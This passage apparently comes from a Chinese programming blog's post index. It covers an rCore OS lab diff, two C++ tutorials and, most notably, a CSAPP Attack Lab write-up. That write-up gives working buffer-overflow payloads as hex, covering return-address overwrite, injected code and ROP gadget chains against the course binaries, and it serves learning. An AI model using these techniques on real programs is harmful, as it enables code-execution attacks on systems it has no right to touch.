&quot;kernel:pid[&#123;&#125;] sys_task_info NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_task_info&quot;,         current_task().unwrap().pid.0     );-    -1+    let task_info = TaskInfo &#123;+        status: TaskStatus::Running,+        syscall_times: current_task().unwrap().get_syscall_times(),+        time: current_task().unwrap().get_scheduled_timespan(),+    &#125;;+    let buffers = translated_byte_buffer(+        current_user_token(), _ti as *const u8, size_of::&lt;TaskInfo&gt;());+    let mut task_info_ptr = &amp;task_info as *const _ as *const u8;+    for buffer in buffers &#123;+        unsafe &#123;+            task_info_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());+            task_info_ptr = task_info_ptr.add(buffer.len());+        &#125;+    &#125;+    0 &#125;  /// YOUR JOB: Implement mmap. pub fn sys_mmap(_start: usize, _len: usize, _port: usize) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_mmap NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_mmap&quot;,         current_task().unwrap().pid.0     );-    -1+    let start_va = VirtAddr::from(_start);+    // 1. illegal start virtual address or port+    if !start_va.aligned() || _port &amp; !0x7 != 0 || _port &amp; 0x7 == 0 &#123;+        return -1;+    &#125;++    // 2. Check is there sufficient physical memory+    if !is_mem_sufficient(_len) &#123;+        return -1;+    &#125;+    +    let end_va = VirtAddr::from(_start + _len);+    current_task().unwrap().mmap(start_va, end_va, _port) &#125;  /// YOUR JOB: Implement munmap. pub fn sys_munmap(_start: usize, _len: usize) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_munmap NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_munmap&quot;,         current_task().unwrap().pid.0     );-    -1+    let start_va = VirtAddr::from(_start);+    if !start_va.aligned() &#123;+        return -1;+    &#125;+    +    let end_va = VirtAddr::from(_start + _len);+    current_task().unwrap().munmap(start_va, end_va) &#125;  /// change data segment size@@ -168,17 +216,34 @@ pub fn sys_sbrk(size: i32) -&gt; isize &#123; /// HINT: fork + exec =/= spawn pub fn sys_spawn(_path: *const u8) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_spawn NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_spawn&quot;,         current_task().unwrap().pid.0     );-    -1+    +    // spawn a new process based upon _path+    let token = current_user_token();+    let _path = translated_str(token, _path);+    let data_opt = open_file(&amp;_path, OpenFlags::RDONLY);+    if data_opt.is_none() &#123;  // invalid file name+        return -1;+    &#125;+    let current_task = current_task().unwrap();+    let new_task = current_task.spawn(data_opt.unwrap().read_all().as_slice());+    let new_pid = new_task.getpid();+    add_task(new_task);+    new_pid as isize &#125;  // YOUR JOB: Set task priority. pub fn sys_set_priority(_prio: isize) -&gt; isize &#123;     trace!(-        &quot;kernel:pid[&#123;&#125;] sys_set_priority NOT IMPLEMENTED&quot;,+        &quot;kernel:pid[&#123;&#125;] sys_set_priority&quot;,         current_task().unwrap().pid.0     );-    -1+    if _prio &lt;= 1 &#123;+        return -1;+    &#125;+    let current_task = current_task().unwrap();+    current_task.set_prio(_prio);+    _prio &#125;diff --git a/os/src/task/manager.rs b/os/src/task/manager.rsindex 99393a4..b0f2b52 100644--- a/os/src/task/manager.rs+++ b/os/src/task/manager.rs@@ -19,11 +19,27 @@ impl TaskManager &#123;     &#125;     /// Add process back to ready queue     pub fn add(&amp;mut self, task: Arc&lt;TaskControlBlock&gt;) &#123;+        task.inc_stride();         self.ready_queue.push_back(task);     &#125;     /// Take a process out of the ready queue     pub fn fetch(&amp;mut self) -&gt; Option&lt;Arc&lt;TaskControlBlock&gt;&gt; &#123;-        self.ready_queue.pop_front()+        // self.ready_queue.pop_front()+        let mut min_stride = isize::MAX;+        let mut best_idx = 0;+        for (idx, tcb) in self.ready_queue.iter().enumerate() &#123;+            let stride = tcb.get_stride();+            if min_stride &gt; stride &#123;+                min_stride = stride;+                best_idx = idx;+            &#125;+        &#125;+        if min_stride == isize::MAX &#123;+            None+        &#125; else &#123;+            self.ready_queue.swap(0, best_idx);+            self.ready_queue.pop_front()+        &#125;     &#125; &#125; diff --git a/os/src/task/processor.rs b/os/src/task/processor.rsindex f05fa09..14b8ae0 100644--- a/os/src/task/processor.rs+++ b/os/src/task/processor.rs@@ -8,6 +8,7 @@ use super::__switch; use super::&#123;fetch_task, TaskStatus&#125;; use super::&#123;TaskContext, TaskControlBlock&#125;; use crate::sync::UPSafeCell;+use crate::timer::get_time_ms; use crate::trap::TrapContext; use alloc::sync::Arc; use lazy_static::*;@@ -61,6 +62,11 @@ pub fn run_tasks() &#123;             let mut task_inner = task.inner_exclusive_access();             let next_task_cx_ptr = &amp;task_inner.task_cx as *const TaskContext;             task_inner.task_status = TaskStatus::Running;+            // if the task is being called for the first time,+            if task_inner.time == 0usize &#123;+                // then set it to the current time+                task_inner.time = get_time_ms();+            &#125;             // release coming task_inner manually             drop(task_inner);             // release coming task TCB manuallydiff --git a/os/src/task/task.rs b/os/src/task/task.rsindex ff5b581..d8c5510 100644--- a/os/src/task/task.rs+++ b/os/src/task/task.rs@@ -1,10 +1,11 @@ //! Types related to task management &amp; Functions for completely changing TCB use super::TaskContext; use super::&#123;kstack_alloc, pid_alloc, KernelStack, PidHandle&#125;;-use crate::config::TRAP_CONTEXT_BASE; use crate::fs::&#123;File, Stdin, Stdout&#125;;-use crate::mm::&#123;MemorySet, PhysPageNum, VirtAddr, KERNEL_SPACE&#125;;+use crate::config::&#123;BIG_STRIDE, MAX_SYSCALL_NUM, TRAP_CONTEXT_BASE&#125;;+use crate::mm::&#123;MapPermission, MemorySet, PhysPageNum, VPNRange, VirtAddr, VirtPageNum, KERNEL_SPACE&#125;; use crate::sync::UPSafeCell;+use crate::timer::get_time_ms; use crate::trap::&#123;trap_handler, TrapContext&#125;; use alloc::sync::&#123;Arc, Weak&#125;; use alloc::vec;@@ -36,6 +37,86 @@ impl TaskControlBlock &#123;         let inner = self.inner_exclusive_access();         inner.memory_set.token()     &#125;+    /// Set the schduling priority+    pub fn set_prio(&amp;self, prio: isize) &#123;+        let mut inner = self.inner_exclusive_access();+        inner.set_prio(prio);+    &#125;+    /// Get the schduling stride+    pub fn get_stride(&amp;self) -&gt; isize &#123;+        let inner = self.inner_exclusive_access();+        inner.stride+    &#125;+    /// Increase the stride by pass+    pub fn inc_stride(&amp;self) &#123;+        let mut inner = self.inner_exclusive_access();+        inner.inc_stride();+    &#125;+    /// Get syscall times+    pub fn get_syscall_times(&amp;self) -&gt; [u32; MAX_SYSCALL_NUM] &#123;+        let inner = self.inner.exclusive_access();+        inner.syscall_times.clone()+    &#125;+    /// Get time span between current time and first scheduled time+    pub fn get_scheduled_timespan(&amp;self) -&gt; usize &#123;+        let inner = self.inner.exclusive_access();+        get_time_ms() - inner.time+    &#125;+    /// Increase syscall times+    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -&gt; bool &#123;+        if syscall_id &gt;= MAX_SYSCALL_NUM &#123;+            return false;+        &#125;+        let mut inner = self.inner.exclusive_access();+        inner.syscall_times[syscall_id] += 1;+        true+    &#125;+    /// Map some pages to memory_set+    pub fn mmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr, port: usize) -&gt; isize &#123;+        let mut inner = self.inner.exclusive_access();+        let vpn_range = VPNRange::new(+            VirtPageNum::from(start_va),+            end_va.ceil()+        );+        +        // 3. Check if trying to map mapped page+        for vpn in vpn_range &#123;+            if let Some(pte) = inner.memory_set.translate(vpn) &#123;+                if pte.is_valid() &#123;+                    return -1;+                &#125;+            &#125;+        &#125;++        // After checking all errors may occur,+        // push a new map_area to current memory_set+        let perm = MapPermission::from_bits((port as u8) &lt;&lt; 1).unwrap() | MapPermission::U;+        inner.memory_set.insert_framed_area(start_va, end_va, perm);+        0+    &#125;++    /// Unmap some pages in memory set+    pub fn munmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr) -&gt; isize &#123;+        let mut inner = self.inner.exclusive_access();+        let vpn_range = VPNRange::new(+            VirtPageNum::from(start_va),+            end_va.ceil(),+        );++        // 1. Check if trying to unmap unmapped page+        for vpn in vpn_range &#123;+            if let Some(pte) = inner.memory_set.translate(vpn) &#123;+                if !pte.is_valid() &#123;+                    return -1+                &#125;+            &#125;+        &#125;++        // After checking all errors may occur,+        // remove some pages from current memory_set+        inner.memory_set.remove_framed_area(vpn_range);+        0+    &#125; &#125;  pub struct TaskControlBlockInner &#123;@@ -71,6 +152,18 @@ pub struct TaskControlBlockInner &#123;      /// Program break     pub program_brk: usize,++    /// Scheduling priority+    pub prio: isize,++    /// Scheduling stride+    pub stride: isize,++    /// The syscall times+    pub syscall_times: [u32; MAX_SYSCALL_NUM],++    /// The first time the task was scheduled+    pub time: usize, &#125;  impl TaskControlBlockInner &#123;@@ -94,6 +187,13 @@ impl TaskControlBlockInner &#123;             self.fd_table.len() - 1         &#125;     &#125;+    pub fn set_prio(&amp;mut self, prio: isize) &#123;+        self.prio = prio;+    &#125;+    pub fn inc_stride(&amp;mut self) &#123;+        let pass = BIG_STRIDE / self.prio;+        self.stride += pass;+    &#125; &#125;  impl TaskControlBlock &#123;@@ -135,6 +235,10 @@ impl TaskControlBlock &#123;                     ],                     heap_bottom: user_sp,                     program_brk: user_sp,+                    prio: 16,+                    stride: 0,+                    syscall_times: [0u32; MAX_SYSCALL_NUM],+                    time: 0usize,                 &#125;)             &#125;,         &#125;;@@ -216,6 +320,10 @@ impl TaskControlBlock &#123;                     fd_table: new_fd_table,                     heap_bottom: parent_inner.heap_bottom,                     program_brk: parent_inner.program_brk,+                    prio: 16,+                    stride: 0,+                    syscall_times: [0u32; MAX_SYSCALL_NUM],+                    time: 0usize,                 &#125;)             &#125;,         &#125;);@@ -231,6 +339,65 @@ impl TaskControlBlock &#123;         // ---- release parent PCB     &#125; +    /// parent process spawn the child process+    pub fn spawn(self: &amp;Arc&lt;Self&gt;, elf_data: &amp;[u8]) -&gt; Arc&lt;Self&gt; &#123;+        let mut parent_inner = self.inner_exclusive_access();+        // create a user space based upon elf_data+        let (memory_set, user_sp, entry_point) = MemorySet::from_elf(elf_data);+        let trap_cx_ppn = memory_set+            .translate(VirtAddr::from(TRAP_CONTEXT_BASE).into())+            .unwrap()+            .ppn();+        // alloc a pid and a kernel stack in kernel space+        let pid_handle = pid_alloc();+        let kernel_stack = kstack_alloc();+        let kernel_stack_top = kernel_stack.get_top();+        // copy fd table+        let mut new_fd_table: Vec&lt;Option&lt;Arc&lt;dyn File + Send + Sync&gt;&gt;&gt; = Vec::new();+        for fd in parent_inner.fd_table.iter() &#123;+            if let Some(file) = fd &#123;+                new_fd_table.push(Some(file.clone()));+            &#125; else &#123;+                new_fd_table.push(None);+            &#125;+        &#125;+        let task_control_block = Arc::new(TaskControlBlock &#123;+            pid: pid_handle,+            kernel_stack,+            inner: unsafe &#123;+                UPSafeCell::new(TaskControlBlockInner &#123;+                    trap_cx_ppn,+                    base_size: user_sp,+                    task_cx: TaskContext::goto_trap_return(kernel_stack_top),+                    task_status: TaskStatus::Ready,+                    memory_set,+                    parent: Some(Arc::downgrade(self)),+                    children: Vec::new(),+                    exit_code: 0,+                    heap_bottom: parent_inner.heap_bottom,+                    program_brk: parent_inner.program_brk,+                    fd_table: new_fd_table,+                    prio: 16,+                    stride: 0,+                    syscall_times: [0u32; MAX_SYSCALL_NUM],+                    time: 0usize,+                &#125;)+            &#125;,+        &#125;);+        // add child+        parent_inner.children.push(task_control_block.clone());+        // modify trap_cx+        let trap_cx = task_control_block.inner_exclusive_access().get_trap_cx();+        *trap_cx = TrapContext::app_init_context(+            entry_point,+            user_sp,+            KERNEL_SPACE.exclusive_access().token(),+            kernel_stack_top,+            trap_handler as usize,+        );+        task_control_block+    &#125;+     /// get pid of process     pub fn getpid(&amp;self) -&gt; usize &#123;         self.pid.0\n问答作业Q: 在我们的 easy-fs 中，root inode 起着什么作用？如果 root inode 中的内容损坏了，会发生什么？\nA: root inode 起着根目录的作用，如果 root inode 中的内容（例如文件数据链接 direct、indirect 等）损坏了，可能导致根目录下的文件无法被正常访问。\n","categories":["操作系统"],"tags":["Rust","操作系统","经验"]},{"title":"C++比较函数cmp","url":"/2021/11/19/C++%E6%AF%94%E8%BE%83%E5%87%BD%E6%95%B0cmp/","content":"本文将简单介绍C++比较函数 cmp.\n排序函数sort()sort函数是我们常用的库函数，它的参数如下：\nvoid sort (RandomAccessIterator first, RandomAccessIterator last, Compare cmp);\n通过传入容器的迭代器（或指针），我们可以对指定位置进行排序：\nvector&lt;int&gt; nums = &#123; 1,3,2,4,5 &#125;;sort(nums.begin(), nums.end()); //排序得到nums = &#123; 1,2,3,4,5 &#125;\n可见，sort 函数的比较函数 cmp 默认参数为升序排列，当然也可以自定义函数来实现不同的排序方法。\n比较函数cmp()自定义比较函数首先编写一个示例用以解释：\nstruct MyStruct &#123;    int weigth;    string str;&#125;;bool cmp(const MyStruct&amp; ms1, const MyStruct&amp; ms2) &#123;    return ms1.weight &lt; ms2.weight;&#125;int main()&#123;    vector&lt;MyStruct&gt; msVector;    sort(msVector.begin(), msVector.end(), cmp);&#125;\n一般来说，cmp 函数具有以下规范：\n\n返回值为 bool 类型，用来表示当前的排序是否正确。\n参数为两个相同类型的变量，且类型与要排序的容器模板类型相同。\n\n关于 cmp 作为比较函数实现排序的原理，可以这样来进行理解：在示例中，ms1 和 ms2 是两个参数，即 msVector 容器中的元素，且此时 ms1 位于 ms2 之前，此时函数的返回值其实就是给出此时排序的正确性。若正确则返回 true，反之返回 false。例如在示例中，该比较函数想要实现 MyStruct 结构体元素按照其 weight 值从小到大进行排列，因此返回值为 ms1.weight &lt; ms2.weight。ms1 位于 ms2 之前，若 ms1.weight &lt; ms2.weight，则返回 true，反之返回 false，与我们的预期相同。\n标准库比较函数如果只是想实现简单的容器的升序或者降序排列，可以直接使用 C++ 标准库中的比较函数：greater() 和 less()，顾名思义，它们分别实现的是降序和升序排列。以下为使用示例：\nvector&lt;int&gt; nums = &#123; 1,3,2,4,5 &#125;;sort(nums.begin(), nums.end(), greater&lt;int&gt;()); //排序得到nums = &#123; 5,4,3,2,1 &#125;sort(nums.begin(), nums.end(), less&lt;int&gt;()); //排序得到nums = &#123; 1,2,3,4,5 &#125;\n由此不难发现，sort 函数中 cmp 的默认参数就是 less&lt;Type&gt;().\n简化比较函数对于一个简单的比较函数，我们可以使用 lambda 表达式来对代码进行简化。（有关 lambda 表达式的内容，可以参考C++ 11 Lambda表达式）\n使用 lambda 表达式，我们可以将“自定义比较函数”处的示例简化。\nsort(msVector.begin(), msVector.end(), [](const MyStruct&amp; ms1, const MyStruct&amp; ms2)&#123;    return ms1.weight &lt; ms2.weight;&#125;);\n例题题目链接：最大单词长度乘积\n对于本题，比较容易想到的是暴力解法，但是直接进行暴力求解将会进行大量的无效计算。因此考虑将数组 words 按其元素的 string 长度从大到小进行排序，并依次两两判断是否是有效解，将有效解保存，在之后的遍历中若当前两 string 长度乘积不大于已保存的解，则立即终止当前循环。\n而将数组 words 按其元素的 string 长度从大到小进行排序这一过程，就用到了 sort 函数以及自定义比较函数。\n以下为解题代码：\nclass Solution &#123;public:    bool isLegal(const string&amp; s1, const string&amp; s2) &#123;        for (const auto&amp; ch1 : s1) &#123;            for (const auto&amp; ch2 : s2) &#123;                if (ch1 == ch2)                    return false;            &#125;        &#125;        return true;    &#125;    int maxProduct(vector&lt;string&gt;&amp; words) &#123;        sort(words.begin(), words.end(), [](const string&amp; x, const string&amp; y) &#123; return x.size() &gt; y.size(); &#125;);        int maxRes = 0;        for (size_t i = 0; i &lt; words.size(); i++) &#123;            for (size_t j = i + 1; j &lt; words.size(); j++) &#123;                if (maxRes &gt;= words[i].size() * words[j].size())                    break;                if (isLegal(words[i], words[j]))                    maxRes = words[i].size() * words[j].size();            &#125;        &#125;        return maxRes;    &#125;&#125;;\n","categories":["C++"],"tags":["C++","算法"]},{"title":"C++复合类型的声明","url":"/2022/03/03/C++%E5%A4%8D%E5%90%88%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%A3%B0%E6%98%8E/","content":"声明语句的构成\n在 C++ 中，一条声明语句由一个基本数据类型（base type）和紧随其后的一个声明符（declarator）列表组成。\n\n\n复合类型的声明定义多个变量对于基本数据类型变量的声明，声明符就是变量名。但对于复合类型来讲，例如指针类型和引用类型，变量名却只是声明符的一部分。例如 int *b; 需要注意的是， “*”运算符修饰的对象是变量名，而不是基本类型名。例如 int *a, b;，此处变量 b 的数据类型为 int，而非 int *。\n指针的引用指针引用的正确定义形式如下：\nint a = 1, * b = &amp;a;int*&amp; c = b; // c为指针b的引用int&amp;* d = b; // 错误，d表示指向引用的指针，而引用本身并不是一个对象，无法使用指针进行指向\n要想正确理解一个复杂的复合类型，可以从右向左进行阅读，离变量名最近的符号越接近该变量的真实类型，如上例中的引用符。\n","categories":["C++"],"tags":["C++"]},{"title":"CSAPP Attack Lab","url":"/2024/09/25/CSAPP-Attack-Lab/","content":"个人感觉非常有意思的一个 Lab，涉及的知识面比较窄，主要关注 缓冲区溢出漏洞 这一个方面，并基于此进行代码攻击，体验一把做黑客的感觉，对应知识点为书中的 3.10 节内容。\n\n这个 Lab 上手便给了我当头一棒，在环境配置上琢磨了好一阵。直接运行 ./ctarget -q ，程序没有让进行输入，而是直接触发了段错误，后来尝试在跑在学校的 Linux 服务器上得以正常运行，原因不明，推测是 WSL 的锅？？\n\nphase_1在倒腾好环境之后，终于可以开始着手完成实验了。\nphase_1 要求我们在调用 getbuf 读取标准输入后，不返回到 test 函数接着执行 printf，而是转而执行 touch1.\nvoid test()&#123;    int val;    val = getbuf();    printf(&quot;No exploit. Getbuf returned 0x%x\\n&quot;, val);&#125;\n可以利用书中 3.10.3 节提到的知识，向缓冲区中写入过量的数据，大到足以覆盖掉调用 getbuf 时压入栈中的返回地址，将其修改为我们想要跳转执行的程序的起始地址，即可达成目的。\n00000000004017a8 &lt;getbuf&gt;:  4017a8:\t48 83 ec 28          \tsub    $0x28,%rsp  4017ac:\t48 89 e7             \tmov    %rsp,%rdi  4017af:\te8 8c 02 00 00       \tcallq  401a40 &lt;Gets&gt;  4017b4:\tb8 01 00 00 00       \tmov    $0x1,%eax  4017b9:\t48 83 c4 28          \tadd    $0x28,%rsp  4017bd:\tc3                   \tretq     4017be:\t90                   \tnop  4017bf:\t90                   \tnop\n观察上述函数 getbuf 的汇编代码，从第一条指令 sub  $0x28,%rsp，可以看到函数 getbuf 的栈帧大小为 40 字节。因此要对返回地址进行写入修改，我们可以先写入 40 字节的任意数据，然后再写入 8 字节的目标地址。\n\n这里的“任意”并非真的任意，因为最终的输入是通过字符串的形式来完成的，因此有些特定的字符可能会导致异常，例如 ‘\\n’（对应 ASCII 码为 0x0a），这里我选用的 0x3f（向灵神致敬😄）。\n\n最终的攻击数据如下所示：\n3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fc0 17 40 00 00 00 00 00  // 目标地址\n可以借助 hex2raw 工具将 16 进制转换为对应的字符串，再管道给 ctarget 即可。\ncat phase_1.txt | ./hex2raw | ./ctarget -q\nphase_2phase_2 相较于相较于 phase_1，由于要验证参数的正确性，因此只是跳转到目标程序位置还不够，还需要设置参数的值。但原始程序中并没有相关的代码，那参数的值应该如何设置？\n这里必须要有一个理念：站在存储的角度，程序与数据并没有区别，它们都是由 0 和 1 组成的比特流。因此，设置参数的代码我们可以自行编写，将其当作数据进行传入，这样的操作称之为 代码注入(code injection) 。最后将我们编写的程序的地址作为返回地址，这样，当程序从 getbuf 返回时，就会跳转到我们先前注入的代码，从而达成目的。\nvoid touch2(unsigned val)&#123;    vlevel = 2; /* Part of validation protocol */    if (val == cookie) &#123;        printf(&quot;Touch2!: You called touch2(0x%.8x)\\n&quot;, val);        validate(2);    &#125; else &#123;        printf(&quot;Misfire: You called touch2(0x%.8x)\\n&quot;, val);        fail(2);    &#125;    exit(0);&#125;\n一种有效的注入代码完成的操作如下：\n\n写入寄存器 %rdi 的值，使其等于 cookie.\n跳转到程序 touch2 处。\n\n关于跳转，实验手册中推荐使用 ret 指令，它可看作是两个步骤的综合：首先从栈中弹出地址 A，然后将 PC 值设置为 A。因此想要跳转到 touch2，可以先使用 push 将 touch2 的地址压入栈中，然后使用 ret 实现跳转。\n对于指令的二进制表示，可以先编译： gcc -c ./injec.s，再反汇编：objdump -d ./injec.o 得到。\nDisassembly of section .text:0000000000000000 &lt;.text&gt;:   0:   48 8b 3c 25 e4 44 60    mov    0x6044e4,%rdi   7:   00    8:   68 ec 17 40 00          pushq  $0x4017ec   d:   c3                      retq\n另外，要想跳转到注入代码的位置，我们必须首先知道它的地址，由于 ctarget 没有使用 栈随机化（stack randomization） ，因此我们完全可以先借助 GDB 打印出调用 Gets 前的栈指针值，再根据注入代码相较于栈指针的偏移计算得到。\n\n最终的攻击数据如下所示：\n48 8b 3c 25 e4 44 60 0068 ec 17 40 00 c3 00 003f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 00\n最后，想吐槽一点，Attack Lab 貌似没法 GDB 调试 getbuf ？没了调试，在一些简单的错误上面卡半天。。。\n\nphase_3phase_3 和 phase_2 很类似，只不过参数由整数换成了字符串，不过思路都是大抵相同的。\nvoid touch3(char *sval)&#123;    vlevel = 3; /* Part of validation protocol */    if (hexmatch(cookie, sval)) &#123;    \tprintf(&quot;Touch3!: You called touch3(\\&quot;%s\\&quot;)\\n&quot;, sval);    \tvalidate(3);    &#125; else &#123;    \tprintf(&quot;Misfire: You called touch3(\\&quot;%s\\&quot;)\\n&quot;, sval);    \tfail(3);    &#125;    exit(0);&#125;/* Compare string to hex represention of unsigned value */int hexmatch(unsigned val, char *sval)&#123;    char cbuf[110];    /* Make position of check string unpredictable */    char *s = cbuf + random() % 100;    sprintf(s, &quot;%.8x&quot;, val);    return strncmp(sval, s, 9) == 0;&#125;\n字符串相较于整数，无外乎多了一层 indirection ，也就是指针。我们只需要预先在某个地址 addr 处将字符串数据进行存储，后续将字符串参数设置为 addr 即可，同样，addr 的值可根据相对于栈的偏移量得到。\n注入的代码如下：\nDisassembly of section .text:0000000000000000 &lt;.text&gt;:   0:   48 c7 c7 88 dc 61 55    mov    $0x5561dc88,%rdi   7:   68 fa 18 40 00          pushq  $0x4018fa   c:   c3                      retq \n而字符串 &quot;59b997fa&quot; 的 ASCII 码表示为：35 39 62 39 39 37 66 61 00，最后的 00 表示 NULL，即 C 语言字符串的终结符。\n这里我遇到了一点问题，这是错误的攻击数据：\n48 c7 c7 88 dc 61 55 68fa 18 40 00 c3 00 00 00 35 39 62 39 39 37 66 6100 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 00\n上面的答案看似没有问题，但是实际上忽略了很重要的一点，字符串的值存放在 getbuf 的栈帧中（0x5561dc78 ~ 0x5561dc98），在完成字符串正确性检验之前，字符串的值都应该 保持不变 。而实际上在函数 getbuf 返回后，它的栈帧空间将会被回收，留给 touch3 和 hexmatch 分配使用，且观察反汇编代码发现分配给 hexmatch 的栈帧空间大于 40 字节，这必然导致 getbuf 栈帧数据被破坏，也就导致了错误。 \n\n一种正确的方式是将字符串数据写入 test 栈帧或更高地址处，因为实验只要求成功触发 touch，而并不要求正确返回到之前的调用过程，因此破坏之前的栈帧对结果无影响。\n48 c7 c7 a8 dc 61 55 68fa 18 40 00 c3 00 00 003f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 0035 39 62 39 39 37 66 6100\n\nphase_4后面的两个实验需要攻击程序是 rtarget，相较于 ctarget，它引入了很多安全措施，例如栈随机化、限制可执行代码区域等，因此攻击起来更为困难。\n参考实验手册，其中介绍了一种很有意思的攻击方法：不手动注入代码，而是借助已存在的代码，将其重组为我们需要的攻击代码。其中，一个以 ret 指令结束的指令序列，称之为一个 gadget，一连串的 gadget 被调用将会产生等价于代码注入的效果。\n\n想法很美好，但是实施起来的过程还是比较痛苦的，要想组合出有效的 gadget，需要仔细对照指令的字节表示和 farm 的反汇编代码，这部分我也是大量 抄袭了 参考了其他人的做法。\n一种正确的 gadget 组合如下：\n# gadget100000000004019ab &lt;addval_219 + 4&gt;:58  pop %rax90  nopc3  ret# gadget200000000004019c5 &lt;setval_426 + 2&gt;:48 89 c7  movq %rax,%rdi90        nopc3\t\t  ret\n返回地址为 0x4019ab，即 gadget1 的起始地址，然后栈中从低到高依次存放：cookie 的值、gadget2 的起始地址、touch2 的起始地址。 \n\n这里要注意出栈是从低地址向高地址方向，与入栈相反。\n\n最终的攻击数据如下：\n3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fab 19 40 00 00 00 00 00fa 97 b9 59 00 00 00 00c5 19 40 00 00 00 00 00ec 17 40 00 00 00 00 00\nphase_5最后 phase_5 的 gadget 构造非常复杂（官解是用了 8 个），在 CMU 的实验中也是属于选做的部分，完成前四个已经有 95 分了，因此这里也只介绍一些问题和思路。\n前面提到，rtarget 引入了栈随机化，这会带来的问题是：在指定参数 sval 时，无法显式地指定地址，而需要依靠间接寻址，即栈指针 %rsp 加上一个相较于它的偏移量。我们可以先确定哪条指令根据栈指针的值计算字符串参数，记录下它的位置和字符串存放位置的偏移量，作为数据一并存入栈中，后续再取出进行计算。\n以下是一种正确的 gadget 实现：\n# gadget100000000004019ab &lt;addval_219 + 4&gt;:58  pop %rax90  nopc3  ret# gadget200000000004019dd &lt;getval_481 + 2&gt;:89 c2   movl %eax,%edx90\t\tnopc3\t\tret# gadget30000000000401a69 &lt;getval_481 + 1&gt;:89 d1   movl %edx,%ecx08 db\torb  %bl,%blc3\t\tret# gadget40000000000401a13 &lt;addval_436 + 2&gt;:89 ce   movl %ecx,%esi90\t\tnop90\t\tnopc3\t\tret# gadget50000000000401aad &lt;setval_350 + 2&gt;:48 89 e0  movq %rsp,%rax90\t\t  nopc3\t\t  ret# gadget600000000004019a2 &lt;addval_273 + 2&gt;:48 89 c7  movq %rax,%rdic3\t\t  ret# gadget700000000004019d6 &lt;add_xy&gt;:48 8d 04 37  lea  (%rdi,%rsi,1),%raxc3\t\t\t ret# gadget800000000004019a2 &lt;addval_273 + 2&gt;:48 89 c7  movq %rax,%rdic3\t\t  ret\n攻击数据的构造和 phase_4 很类似，就不过多赘述了。\n3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fab 19 40 00 00 00 00 0020 00 00 00 00 00 00 00dd 19 40 00 00 00 00 0069 1a 40 00 00 00 00 0013 1a 40 00 00 00 00 00ad 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40 00 00 00 00 0035 39 62 39 39 37 66 6100\n","categories":["计算机基础"],"tags":["经验","计算机基础","汇编语言"]},{"title":"CSAPP Data Lab","url":"/2024/08/31/CSAPP-Data-Lab/","content":"CSAPP 的第一个 Lab，对应知识点为书中的第 2 章（信息的表示与处理），要求使用受限制的运算符和表达式实现一些位操作。主要分为两个部分：整数部分和浮点数部分。其中整数部分限制较多，比较偏重技巧性，部分题个人认为很有难度。而浮点数部分则比较基础，主要考察对 IEEE 754 标准的熟悉程度，代码较长，但思路相对简单。\nbitXor思路使用德-摩根定律进行推导，推导过程如下：\n\n代码int bitXor(int x, int y) &#123;    // 德-摩根定律    return ~(~(x &amp; ~y) &amp; ~(~x &amp; y));&#125;\ntmin思路最小整数即最高位（负数权重）为 1，其余（正数权重）为 0。\n代码int tmin(void) &#123;    return 1 &lt;&lt; 31;&#125;\nisTmax思路由于不能使用左移运算符，因此没办法直接构造出 tmax，需要仔细考虑 tmax 的性质：tmax = 0x7fffffff ，而 tmax + 1 = 0x80000000 ，这两个数的二进制位完全互补，因此满足：tmax + tmax + 1 = 0xffffffff，结果全为 1，对该结果取反即可得到 0，取非得到 1。\n但这里还要考虑一个特殊情况：当 x = 0xffffffff 时，x + 1 + x 也满足等于 0xffffffff，因此需要借助异或运算进行特判。\n代码int isTmax(int x) &#123;    int case1 = !((x + 1) ^ 0);  // case = x == 0xffffffff ? 1 : 0;    return !(~(x + 1 + x)) &amp; !case1;&#125;\nallOddBits思路首先构造一个掩码 mask，奇数位全为 1，偶数位全为 0。将 mask 与 x 进行按位与，如果 x 的奇数位全为 1，那么按位与的结果仍然为 mask。然后便可以借助异或和非的组合，将结果转换为 0 或 1。\n代码int allOddBits(int x) &#123;    int mask = 0xaa;            // mask = 0x000000aa    mask = (mask &lt;&lt; 8) | 0xaa;  // mask = 0x0000aaaa    mask = (mask &lt;&lt; 8) | 0xaa;  // mask = 0x00aaaaaa    mask = (mask &lt;&lt; 8) | 0xaa;  // mask = 0xaaaaaaaa    return !((x &amp; mask) ^ mask);&#125;\nnegate思路补码表示法的重要特性，取反加一即可。\n代码int negate(int x) &#123;    return ~x + 1;&#125;\nisAsciiDigit思路这里我用了比较笨的逐位判断的方法。首先判断第 4 到第 31 位是否为 0x3，然后只需要关注低 4 位的二进制表示了：若第 3 位为 0，则一定位于指定范围之内，再加上两个特例（1000 和 